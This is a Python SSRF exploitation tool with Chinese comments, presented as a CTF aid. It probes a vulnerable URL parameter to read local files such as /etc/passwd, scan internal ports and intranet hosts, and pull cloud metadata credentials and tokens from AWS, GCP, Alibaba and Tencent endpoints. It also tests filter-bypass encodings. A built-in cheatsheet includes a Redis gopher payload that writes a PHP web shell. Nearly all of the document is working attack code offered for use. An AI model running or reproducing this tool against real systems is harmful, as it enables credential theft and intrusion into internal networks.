#!/usr/bin/env python3
"""
CTF 解题工具 — SSRF 服务端请求伪造验证工具
==========================================
用途: 面向 CTF 竞赛的自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

功能模块:
1. 检测阶段：自动验证 SSRF 存在性
2. 内网探测：探测内网服务端口状态
3. 协议构造：支持多种 CTF 常见协议构造
4. 云环境元数据：读取云元数据接口（CTF 高频考点）

核心依赖: requests

使用方式:
  # 自动检测 SSRF
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url

  # 探测内网端口
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --scan-ports

  # 读取云元数据
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --metadata

  # 指定协议构造
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --proto file --path /etc/passwd

比赛时替换 URL 和参数名即可。
"""

import argparse
import base64
import sys
import time
import re
from urllib.parse import urlparse, quote

try:
    import requests
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    sys.exit(1)

# ============================================================
# 检测标记 — 用于判断 SSRF 是否成功
# ============================================================

# 常见文件内容标记
FILE_MARKERS = {
    '/etc/passwd': ['root:', 'daemon:', 'bin:', '/bin/'],
    '/etc/hosts': ['localhost', '127.0.0.1'],
    '/proc/self/environ': ['PATH=', 'HOME=', 'USER='],
    '/proc/self/cmdline': ['/', '\x00'],
    'win.ini': ['[fonts]', '[extensions]'],
    'web.config': ['<configuration', '<system.webServer'],
}

# 云元数据常见路径（CTF 竞赛高频考点）
CLOUD_METADATA_PATHS = [
    # AWS EC2
    '/latest/meta-data/',
    '/latest/meta-data/iam/security-credentials/',
    '/latest/meta-data/instance-id',
    '/latest/meta-data/local-hostname',
    # GCP
    '/computeMetadata/v1/',
    '/computeMetadata/v1/instance/service-accounts/default/token',
    # 阿里云
    '/meta-data/instance-id',
    '/meta-data/ram/security-credentials/',
    # 腾讯云
    '/meta-data/instance-id',
    '/meta-data/cam/security-credentials/',
    # Azure
    '/metadata/instance?api-version=2021-02-01',
]


class SSRFToolkit:
    """CTF 竞赛 SSRF 解题工具"""

    def __init__(self, url, param, method='GET', data=None,
                 cookies=None, headers=None, timeout=10, proxy=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if cookies:
            self.session.headers['Cookie'] = cookies
        if headers:
            self.session.headers.update(headers)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        # 获取基准响应
        self.baseline = self._get_baseline()

    def _get_baseline(self):
        """获取基准响应，用于对比判断"""
        text = self._fetch_url('http://127.0.0.1:1/not_exist')
        return text or ''

    def _fetch_url(self, target_url):
        """通过目标参数发送请求"""
        params = {}
        data = {}

        if self.method == 'GET':
            params[self.param] = target_url
        else:
            data[self.param] = target_url

        data.update(self.data)

        try:
            if self.method == 'GET':
                resp = self.session.get(self.url, params=params, timeout=self.timeout)
            else:
                resp = self.session.post(self.url, data=data, timeout=self.timeout)
            return resp.text
        except requests.RequestException:
            return None

    def _fetch_with_headers(self, target_url, extra_headers=None):
        """带自定义请求头的请求（用于 GCP 元数据等需要特定头的场景）"""
        params = {self.param: target_url}
        original_headers = dict(self.session.headers)

        if extra_headers:
            self.session.headers.update(extra_headers)

        try:
            resp = self.session.get(self.url, params=params, timeout=self.timeout)
            text = resp.text
        except:
            text = None
        finally:
            self.session.headers = original_headers

        return text

    # ============================================================
    # 模块 1: SSRF 检测
    # ============================================================

    def detect(self):
        """自动检测 SSRF 存在性"""
        print("[*] 开始 SSRF 检测...")

        found = False

        # 测试1: 请求本地文件（file 协议）
        print("  [*] 测试 file 协议读取 /etc/passwd")
        text = self._fetch_url('file:///etc/passwd')
        if text and self._check_markers(text, FILE_MARKERS['/etc/passwd']):
            print("  [+] 检测到 SSRF — file 协议可用，已读取 /etc/passwd")
            print(f"  [+] 内容片段: {text[:200]}")
            found = True

        # 测试2: 请求本地 HTTP 服务
        print("  [*] 测试 HTTP 请求到 127.0.0.1")
        text = self._fetch_url('http://127.0.0.1/')
        if text and text != self.baseline and len(text) > 0:
            if not found:
                print("  [+] 检测到 SSRF — 可请求本地 HTTP 服务")
                found = True

        # 测试3: 请求本地端口
        print("  [*] 测试 HTTP 请求到 127.0.0.1:80")
        text = self._fetch_url('http://127.0.0.1:80/')
        if text and text != self.baseline:
            if not found:
                print("  [+] 检测到 SSRF — 本地 80 端口有响应")
                found = True

        # 测试4: IPv6 绕过
        print("  [*] 测试 IPv6 本地地址")
        text = self._fetch_url('http://[::1]/')
        if text and text != self.baseline:
            if not found:
                print("  [+] 检测到 SSRF — IPv6 可用")
                found = True

        if not found:
            print("  [-] 未检测到明显 SSRF")

        return found

    def _check_markers(self, text, markers):
        """检查文本中是否包含标记"""
        return any(m in text for m in markers)

    # ============================================================
    # 模块 2: 内网端口探测
    # ============================================================

    def scan_ports(self, host='127.0.0.1', ports=None, top_common=True):
        """
        探测内网主机端口开放状态。
        通过 SSRF 请求目标端口，根据响应差异判断端口是否开放。
        """
        if ports is None:
            if top_common:
                ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
                         443, 445, 873, 1080, 1433, 1521, 2049, 2375,
                         3000, 3306, 5000, 5432, 5900, 6379, 7001,
                         8000, 8080, 8443, 8888, 9000, 9090, 9200,
                         11211, 27017]
            else:
                ports = list(range(1, 1001))

        print(f"[*] 内网端口探测: {host}")
        print(f"[*] 端口列表: {len(ports)} 个")

        open_ports = []
        # 获取基准延迟
        baseline_time = self._measure_latency(f'http://{host}:1/')

        for port in ports:
            target = f'http://{host}:{port}/'
            latency, text = self._measure_latency_with_response(target)

            # 判断端口是否开放：响应时间短于超时 或 响应内容不同于关闭端口
            is_open = False

            if text and text != self.baseline:
                # 有内容响应，端口可能开放
                is_open = True
            elif latency is not None and baseline_time is not None:
                # 响应时间明显快于关闭端口
                if latency < baseline_time * 0.5 and latency < self.timeout:
                    is_open = True

            if is_open:
                open_ports.append(port)
                status = f"开放 (延迟={latency:.2f}s)" if latency else "开放"
                print(f"  [+] {host}:{port} — {status}")

        if not open_ports:
            print(f"  [-] 未探测到开放端口")

        print(f"\n[*] 探测完成: {len(open_ports)} 个端口开放")
        return open_ports

    def _measure_latency(self, url):
        """测量请求延迟"""
        start = time.time()
        self._fetch_url(url)
        return time.time() - start

    def _measure_latency_with_response(self, url):
        """测量延迟并返回响应"""
        start = time.time()
        text = self._fetch_url(url)
        elapsed = time.time() - start
        return elapsed, text

    # ============================================================
    # 模块 3: 协议构造
    # ============================================================

    def read_file(self, filepath):
        """通过 file 协议读取文件"""
        print(f"\n[*] file 协议读取: {filepath}")
        text = self._fetch_url(f'file://{filepath}')
        if text and text != self.baseline:
            print(f"  [+] 读取成功:")
            print(f"  {text[:500]}")
            return text
        print("  [-] 读取失败")
        return None

    def read_dict(self, host, port=2628):
        """通过 dict 协议探测服务"""
        print(f"\n[*] dict 协议探测: {host}:{port}")
        # dict 协议可以获取服务信息
        text = self._fetch_url(f'dict://{host}:{port}/info')
        if text and text != self.baseline:
            print(f"  [+] 探测结果:")
            print(f"  {text[:500]}")
            return text
        print("  [-] 探测失败")
        return None

    def read_ftp(self, host, port=21):
        """通过 ftp 协议测试 FTP 服务"""
        print(f"\n[*] ftp 协议测试: {host}:{port}")
        text = self._fetch_url(f'ftp://{host}:{port}/')
        if text and text != self.baseline:
            print(f"  [+] FTP 响应:")
            print(f"  {text[:500]}")
            return text
        print("  [-] 无响应")
        return None

    def read_gopher(self, host, port, data):
        """
        Gopher 协议构造请求。
        Gopher 协议可以构造任意 TCP 协议数据包。
        """
        print(f"\n[*] Gopher 协议构造: {host}:{port}")
        # 构造 Gopher URL
        # gopher://host:port/_<URL编码的数据>
        encoded_data = quote(data)
        gopher_url = f'gopher://{host}:{port}/_{encoded_data}'
        print(f"  [*] 构造 URL: {gopher_url[:100]}...")
        text = self._fetch_url(gopher_url)
        if text and text != self.baseline:
            print(f"  [+] 响应:")
            print(f"  {text[:500]}")
            return text
        print("  [-] 无响应")
        return None

    # ============================================================
    # 模块 4: 云环境元数据读取
    # ============================================================

    def read_cloud_metadata(self, cloud_type='auto'):
        """
        读取云环境元数据接口（CTF 高频考点）。
        通过 SSRF 请求云元数据 API 获取敏感信息。
        """
        print(f"\n[*] 云元数据读取 (模式: {cloud_type})")

        # AWS EC2 元数据 (不需要额外请求头)
        if cloud_type in ('auto', 'aws'):
            print("  [*] 尝试 AWS EC2 元数据...")
            for path in CLOUD_METADATA_PATHS[:4]:
                url = f'http://169.254.169.254{path}'
                print(f"    请求: {url}")
                text = self._fetch_url(url)
                if text and text.strip() and text != self.baseline:
                    print(f"    [+] 响应: {text[:300]}")
                    return text

        # GCP 元数据 (需要 Metadata-Flavor 头)
        if cloud_type in ('auto', 'gcp'):
            print("  [*] 尝试 GCP 元数据...")
            gcp_url = 'http://metadata.google.internal/computeMetadata/v1/'
            text = self._fetch_with_headers(gcp_url, {'Metadata-Flavor': 'Google'})
            if text and text.strip() and text != self.baseline:
                print(f"    [+] 响应: {text[:300]}")
                return text

        # 阿里云元数据
        if cloud_type in ('auto', 'aliyun'):
            print("  [*] 尝试阿里云元数据...")
            for path in CLOUD_METADATA_PATHS[4:7]:
                url = f'http://100.100.100.200{path}'
                print(f"    请求: {url}")
                text = self._fetch_url(url)
                if text and text.strip() and text != self.baseline:
                    print(f"    [+] 响应: {text[:300]}")
                    return text

        # 腾讯云元数据
        if cloud_type in ('auto', 'tencent'):
            print("  [*] 尝试腾讯云元数据...")
            for path in CLOUD_METADATA_PATHS[7:9]:
                url = f'http://metadata.tencentyun.com{path}'
                print(f"    请求: {url}")
                text = self._fetch_url(url)
                if text and text.strip() and text != self.baseline:
                    print(f"    [+] 响应: {text[:300]}")
                    return text

        print("  [-] 未获取到云元数据")
        return None

    # ============================================================
    # 模块 5: 内网 Web 服务探测
    # ============================================================

    def probe_intranet_web(self, start_ip='192.168.1.1', end_ip='192.168.1.254',
                           port=80, path='/', timeout_per=5):
        """探测内网 Web 服务"""
        print(f"[*] 内网 Web 服务探测: {start_ip}-{end_ip}:{port}")

        # 解析 IP 范围
        start_parts = list(map(int, start_ip.split('.')))
        end_parts = list(map(int, end_ip.split('.')))

        found_services = []

        for d in range(start_parts[3], end_parts[3] + 1):
            ip = f"{start_parts[0]}.{start_parts[1]}.{start_parts[2]}.{d}"
            target = f'http://{ip}:{port}{path}'
            text = self._fetch_url(target)

            if text and text != self.baseline:
                # 尝试提取标题
                title = self._extract_title(text)
                print(f"  [+] {ip}:{port} — {title or '有响应'}")
                found_services.append({'ip': ip, 'port': port, 'title': title, 'response': text[:200]})

        if not found_services:
            print("  [-] 未探测到内网 Web 服务")

        return found_services

    def _extract_title(self, html):
        """从 HTML 中提取标题"""
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else None

    # ============================================================
    # 模块 6: 协议绕过验证
    # ============================================================

    def test_bypass(self):
        """测试各种绕过方式"""
        print("\n[*] SSRF 绕过方式测试")
        print(f"{'='*50}")

        bypass_targets = [
            # IP 地址绕过
            ('localhost', 'http://localhost/'),
            ('127.0.0.1', 'http://127.0.0.1/'),
            ('0.0.0.0', 'http://0.0.0.0/'),
            ('[::1] IPv6', 'http://[::1]/'),
            ('0x7f000001 十六进制', 'http://0x7f000001/'),
            ('2130706433 十进制', 'http://2130706433/'),
            ('017700000001 八进制', 'http://017700000001/'),
            ('127.1 短格式', 'http://127.1/'),
            ('127.0.0.1.nip.io DNS', 'http://127.0.0.1.nip.io/'),
            # URL 编码绕过
            ('URL编码', 'http://%31%32%37%2e%30%2e%30%2e%31/'),
            # 协议绕过
            ('dict 协议', 'dict://127.0.0.1:6379/info'),
            ('gopher 协议', 'gopher://127.0.0.1:25/_HELO%20test'),
        ]

        results = []
        for name, target in bypass_targets:
            print(f"  [*] {name}: {target}")
            text = self._fetch_url(target)
            if text and text != self.baseline:
                print(f"      [+] 有响应 ({len(text)} 字节)")
                results.append((name, target, True))
            else:
                print(f"      [-] 无响应")
                results.append((name, target, False))

        print(f"\n[*] 有效绕过: {sum(1 for _, _, ok in results if ok)}/{len(results)}")
        return results


# ============================================================
# SSRF 考点 Payload 速查表
# ============================================================

SSRF_CHEATSHEET = """
============================================================
CTF 竞赛 SSRF 考点速查表
============================================================

【1. IP 地址绕过】
  127.0.0.1 → localhost, 0.0.0.0, [::1]
  十进制:   2130706433
  十六进制: 0x7f000001
  八进制:   017700000001
  短格式:   127.1, 127.0.1
  DNS重绑定: 127.0.0.1.xip.io, rbndr.us

【2. 协议利用】
  file://    读取本地文件: file:///etc/passwd
  dict://    探测服务: dict://127.0.0.1:6379/info
  gopher://  构造TCP: gopher://host:port/_DATA
  ftp://     FTP服务: ftp://host:port/
  ldap://    LDAP: ldap://host:port/

【3. 云元数据 (CTF 高频)】
  AWS:   http://169.254.169.254/latest/meta-data/
  GCP:   http://metadata.google.internal/computeMetadata/v1/
  阿里云: http://100.100.100.200/meta-data/
  腾讯云: http://metadata.tencentyun.com/meta-data/

【4. Gopher 协议构造】
  HTTP GET:
    gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

  Redis 写文件:
    gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$<len>%0d%0a<data>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$4%0d%0a/tmp/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a

【5. URL 解析差异】
  http://evil@127.0.0.1/     (用户名绕过)
  http://127.0.0.1#@evil.com/ (片段绕过)
  http://127.0.0.1\\@evil.com/ (反斜杠绕过)

【6. 常见内网服务端口】
  6379 Redis, 11211 Memcached
  27017 MongoDB, 9200 Elasticsearch
  3306 MySQL, 5432 PostgreSQL
  7001 WebLogic, 8080 Tomcat
  9000 PHP-FPM, 2375 Docker

============================================================
"""


# ============================================================
# 命令行入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='CTF 竞赛 SSRF 解题工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 自动检测 SSRF
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url

  # 探测内网端口
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --scan-ports

  # 读取文件
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --proto file --path /etc/passwd

  # 云元数据读取
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --metadata

  # 测试绕过方式
  python web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --bypass

  # 速查表
  python web_ssrf_toolkit.py cheatsheet
        """
    )

    parser.add_argument('-u', '--url', help='目标 URL')
    parser.add_argument('--param', help='SSRF 注入参数名')
    parser.add_argument('--method', default='GET', help='HTTP 方法 (GET/POST)')
    parser.add_argument('--data', help='POST 数据 (key=value&key2=value2)')
    parser.add_argument('--cookies', help='Cookie 字符串')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时 (秒)')
    parser.add_argument('--proxy', help='HTTP 代理')

    parser.add_argument('--detect', action='store_true', help='自动检测 SSRF')
    parser.add_argument('--scan-ports', action='store_true', help='探测内网端口')
    parser.add_argument('--host', default='127.0.0.1', help='内网探测目标主机')
    parser.add_argument('--ports', help='自定义端口列表 (逗号分隔)')
    parser.add_argument('--metadata', action='store_true', help='读取云元数据')
    parser.add_argument('--cloud', default='auto',
                        choices=['auto', 'aws', 'gcp', 'aliyun', 'tencent'],
                        help='云平台类型')
    parser.add_argument('--proto', choices=['file', 'dict', 'ftp', 'gopher'],
                        help='指定协议类型')
    parser.add_argument('--path', help='文件路径或服务路径')
    parser.add_argument('--port', type=int, help='目标端口')
    parser.add_argument('--bypass', action='store_true', help='测试绕过方式')
    parser.add_argument('--probe-web', action='store_true', help='探测内网 Web 服务')
    parser.add_argument('--start-ip', default='192.168.1.1', help='起始 IP')
    parser.add_argument('--end-ip', default='192.168.1.254', help='结束 IP')

    args = parser.parse_args()

    if 'cheatsheet' in sys.argv:
        print(SSRF_CHEATSHEET)
        return

    if not args.url or not args.param:
        parser.print_help()
        return

    # 解析 POST data
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v

    toolkit = SSRFToolkit(
        url=args.url,
        param=args.param,
        method=args.method,
        data=data,
        cookies=args.cookies,
        timeout=args.timeout,
        proxy=args.proxy,
    )

    # 执行功能
    if args.scan_ports:
        ports = None
        if args.ports:
            ports = [int(p.strip()) for p in args.ports.split(',')]
        toolkit.scan_ports(args.host, ports)

    elif args.metadata:
        toolkit.read_cloud_metadata(args.cloud)

    elif args.proto:
        if args.proto == 'file' and args.path:
            toolkit.read_file(args.path)
        elif args.proto == 'dict':
            port = args.port or 2628
            toolkit.read_dict(args.host, port)
        elif args.proto == 'ftp':
            port = args.port or 21
            toolkit.read_ftp(args.host, port)
        elif args.proto == 'gopher' and args.path:
            port = args.port or 80
            toolkit.read_gopher(args.host, port, args.path)

    elif args.bypass:
        toolkit.test_bypass()

    elif args.probe_web:
        port = args.port or 80
        toolkit.probe_intranet_web(args.start_ip, args.end_ip, port)

    else:
        # 默认: 检测
        toolkit.detect()


if __name__ == '__main__':
    main()
